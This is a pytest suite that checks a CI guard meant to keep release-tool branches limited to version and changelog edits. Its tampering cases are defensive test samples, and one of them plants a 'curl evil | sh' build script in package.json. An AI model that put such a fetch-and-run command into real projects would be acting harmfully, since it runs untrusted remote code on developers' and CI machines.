"""End-to-end: the release-branch guard the composed `lint` job runs.

The test jobs skip the release tool's own branch, so `lint`'s guard is the only
thing standing between that branch and an untested merge. Each case composes a
repository with the real composer, makes it a real git repository whose base
commit holds a Rust workspace and a package.json, commits one release branch's
edits on top, and runs the guard step exactly as the rendered ci.yml writes it —
its `run:` line under bash, with `BASE_SHA` as its `env:` names it — through the
real `node` and `git`. Legitimate release edits pass; anything else edited inside
the very files a release touches fails, naming the file and why.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
from ci_cd_shape import compose, jobs, workflow

STEP = "      - name: Hold the release branch to the release tool's edits\n"

CARGO_TOML = """\
[workspace]
members = ["core"]

[package]
name = "demo"
version = "0.3.0"
edition = "2021"

[dependencies]
demo-core = { path = "core", version = "0.3.0" } # the workspace's own crate
serde = "1.0.200"
docs-only = { version = "1.0.0" } # path = "documentation only"
tricky = { version = "1.0.0", registry = "path = \"here\"" }

[profile.release]
lto = true
"""
CORE_TOML = """\
[package]
name = "demo-core"
version = "0.3.0"
edition = "2021"
"""
CARGO_LOCK = """\
# This file is automatically @generated by Cargo.
version = 4

[[package]]
name = "demo"
version = "0.3.0"
dependencies = [
 "demo-core",
 "serde",
]

[[package]]
name = "demo-core"
version = "0.3.0"

[[package]]
name = "serde"
version = "1.0.200"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "aaaa"
"""
PACKAGE = {
    "name": "demo",
    "version": "0.3.0",
    "private": True,
    "scripts": {"build": "tsc -p ."},
    "devDependencies": {"@onebudgetspec/cli": "0.1.3", "typescript": "5.6.0"},
}
MANIFEST = {".": "0.3.0"}
CHANGELOG = "# Changelog\n\n## 0.3.0\n\n- first\n"


def git(repo: Path, *args: str) -> str:
    done = subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True)
    assert done.returncode == 0, done.stderr
    return done.stdout.strip()


def write(repo: Path, rel: str, text: str) -> None:
    path = repo / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def edit(repo: Path, rel: str, old: str, new: str) -> None:
    text = (repo / rel).read_text(encoding="utf-8")
    assert old in text, (rel, old)
    write(repo, rel, text.replace(old, new))


def edit_json(repo: Path, rel: str, change) -> None:
    data = json.loads((repo / rel).read_text(encoding="utf-8"))
    change(data)
    write(repo, rel, json.dumps(data, indent=2) + "\n")


@pytest.fixture(scope="module")
def composed(tmp_path_factory) -> Path:
    if shutil.which("node") is None or shutil.which("git") is None:
        pytest.fail("node and git must be on PATH — run `just bootstrap`")
    return compose(tmp_path_factory.mktemp("guard") / "repo")


@pytest.fixture
def release_branch(composed, tmp_path):
    """A git repository at the base commit, on the release tool's branch."""
    repo = tmp_path / "repo"
    shutil.copytree(composed, repo, symlinks=True)
    write(repo, "Cargo.toml", CARGO_TOML)
    write(repo, "core/Cargo.toml", CORE_TOML)
    write(repo, "Cargo.lock", CARGO_LOCK)
    write(repo, "package.json", json.dumps(PACKAGE, indent=2) + "\n")
    write(repo, ".release-please-manifest.json", json.dumps(MANIFEST) + "\n")
    write(repo, "CHANGELOG.md", CHANGELOG)
    git(repo, "init", "-q", "-b", "main")
    git(repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "add", "-A")
    git(
        repo,
        "-c",
        "user.name=t",
        "-c",
        "user.email=t@example.com",
        "commit",
        "-qm",
        "base",
    )
    base = git(repo, "rev-parse", "HEAD")
    git(repo, "checkout", "-qb", "release-plz-2026-11-02")
    return repo, base


def run_guard(repo: Path, base: str) -> subprocess.CompletedProcess:
    """Commit the branch's edits, then run the guard step as ci.yml writes it."""
    git(repo, "add", "-A")
    git(
        repo,
        "-c",
        "user.name=t",
        "-c",
        "user.email=t@example.com",
        "commit",
        "-qm",
        "release",
    )
    lint = jobs(workflow(repo, "ci.yml"))["lint"] + "\n"
    step = lint[lint.index(STEP[len("      ") :]) :]
    step = step[: step.index("\n      - ", 1)]
    assert "BASE_SHA: ${{ github.event.pull_request.base.sha }}" in step
    [script] = re.findall(r"^        run: (.+)$", step, re.M)
    return subprocess.run(
        ["bash", "-c", script],
        cwd=repo,
        env={"PATH": os.environ["PATH"], "BASE_SHA": base},
        capture_output=True,
        text=True,
        timeout=120,
    )


def bump_rust(repo: Path) -> None:
    edit(repo, "Cargo.toml", 'version = "0.3.0"\nedition', 'version = "0.4.0"\nedition')
    edit(
        repo,
        "Cargo.toml",
        'path = "core", version = "0.3.0"',
        'path = "core", version = "0.4.0"',
    )
    edit(repo, "core/Cargo.toml", '"0.3.0"', '"0.4.0"')
    edit(
        repo,
        "Cargo.lock",
        'name = "demo"\nversion = "0.3.0"',
        'name = "demo"\nversion = "0.4.0"',
    )
    edit(
        repo,
        "Cargo.lock",
        'name = "demo-core"\nversion = "0.3.0"',
        'name = "demo-core"\nversion = "0.4.0"',
    )
    edit(repo, "CHANGELOG.md", "## 0.3.0", "## 0.4.0\n\n- second\n\n## 0.3.0")
    write(repo, "core/CHANGELOG.md", "# Changelog\n\n## 0.4.0\n")


def bump_node(repo: Path) -> None:
    edit_json(repo, "package.json", lambda p: p.update(version="0.4.0"))
    edit_json(repo, ".release-please-manifest.json", lambda m: m.update({".": "0.4.0"}))
    edit(repo, "CHANGELOG.md", "## 0.3.0", "## 0.4.0\n\n- second\n\n## 0.3.0")


# --- the release tool's own edits pass -----------------------------------------


def test_the_step_runs_the_content_guard_rather_than_a_name_filter(composed):
    lint = jobs(workflow(composed, "ci.yml"))["lint"]
    assert (
        'run: node scripts/release-branch-guard.mjs --base "$BASE_SHA" --head HEAD'
        in lint
    )
    assert "grep -Ev" not in lint
    source = Path(__file__).resolve().parents[2] / "assets" / "release-branch-guard.mjs"
    copy = composed / "scripts" / "release-branch-guard.mjs"
    assert copy.read_bytes() == source.read_bytes()


@pytest.mark.parametrize(
    "bump", [bump_rust, bump_node], ids=["release-plz", "release-please"]
)
def test_a_release_tools_version_and_changelog_edits_pass(release_branch, bump):
    repo, base = release_branch
    bump(repo)
    done = run_guard(repo, base)
    assert done.returncode == 0, done.stderr
    assert "all release-tool version and changelog edits" in done.stdout


# --- anything else inside the allowed files fails ------------------------------

TAMPERING = {
    # `path =` in a comment, or inside another field's string, names no workspace
    # crate: only a `path` field of the table itself does.
    "an external version moved beside a commented-out path": (
        lambda r: edit(
            r,
            "Cargo.toml",
            'docs-only = { version = "1.0.0" }',
            'docs-only = { version = "2.0.0" }',
        ),
        "Cargo.toml: it changes more than the package version",
    ),
    "an external version moved beside a path inside a string": (
        lambda r: edit(
            r,
            "Cargo.toml",
            'tricky = { version = "1.0.0"',
            'tricky = { version = "2.0.0"',
        ),
        "Cargo.toml: it changes more than the package version",
    ),
    "a dependency added to Cargo.toml": (
        lambda r: edit(r, "Cargo.toml", 'serde = "1.0.200"', 'serde = "1.0.200"\nevil = "0.1.0"'),
        "Cargo.toml: it changes more than the package version",
    ),
    "an external dependency's version moved in Cargo.toml": (
        lambda r: edit(r, "Cargo.toml", 'serde = "1.0.200"', 'serde = "1.0.201"'),
        "Cargo.toml: it changes more than the package version",
    ),
    "a build setting in Cargo.toml": (
        lambda r: edit(r, "Cargo.toml", "lto = true", "lto = false"),
        "Cargo.toml: it changes more than the package version",
    ),
    "a build script added to [package]": (
        lambda r: edit(r, "Cargo.toml", 'edition = "2021"\n\n[dep', 'edition = "2021"\nbuild = "build.rs"\n\n[dep'),
        "Cargo.toml: it changes more than the package version",
    ),
    "an external package's version moved in Cargo.lock": (
        lambda r: edit(r, "Cargo.lock", 'version = "1.0.200"', 'version = "1.0.201"'),
        "Cargo.lock: it changes more than workspace members' versions",
    ),
    "a package.json script": (
        lambda r: edit_json(r, "package.json", lambda p: p["scripts"].update(build="curl evil | sh")),
        "package.json: it changes more than its top-level version",
    ),
    "a package.json dependency": (
        lambda r: edit_json(r, "package.json", lambda p: p["devDependencies"].update(typescript="5.7.0")),
        "package.json: it changes more than its top-level version",
    ),
    "a package.json version that is not a version": (
        lambda r: edit_json(r, "package.json", lambda p: p.update(version="latest")),
        'package.json: its version "latest" is not a semantic version',
    ),
    "a manifest value that is not a version": (
        lambda r: edit_json(r, ".release-please-manifest.json", lambda m: m.update({".": "x"})),
        ".release-please-manifest.json: . is not given a semantic version",
    ),
    "a source file": (
        lambda r: write(r, "src/lib.rs", "pub fn f() {}\n"),
        "src/lib.rs: it is new, and only a CHANGELOG.md may be added",
    ),
    "a workflow edited": (
        lambda r: edit(r, ".github/workflows/ci.yml", "timeout-minutes: 30", "timeout-minutes: 300"),
        ".github/workflows/ci.yml: the release tool edits only versions and changelogs",
    ),
    "a lockfile deleted": (
        lambda r: (r / "Cargo.lock").unlink(),
        "Cargo.lock: it is deleted",
    ),
}  # fmt: skip


@pytest.mark.parametrize("name", sorted(TAMPERING))
def test_a_non_release_edit_inside_the_release_files_fails_lint(release_branch, name):
    repo, base = release_branch
    # Riding along with a real version bump: the files' names alone all pass.
    bump_rust(repo)
    bump_node(repo)
    tamper, finding = TAMPERING[name]
    tamper(repo)
    done = run_guard(repo, base)
    assert done.returncode == 1, done.stdout + done.stderr
    assert (
        "carries more than the release tool's version and changelog edits"
        in done.stderr
    )
    assert f"  {finding}" in done.stderr, done.stderr
    # Only the tampered file is named: the bump beside it is a release edit.
    named = [
        line
        for line in done.stderr.splitlines()
        if line.startswith("  ") and not line.startswith("  next:")
    ]
    assert len(named) == 1, named


def test_a_base_the_history_does_not_hold_is_an_invocation_error(release_branch):
    repo, _base = release_branch
    bump_rust(repo)
    done = run_guard(repo, "0" * 40)
    assert done.returncode == 2
    assert "fetch the full history" in done.stderr
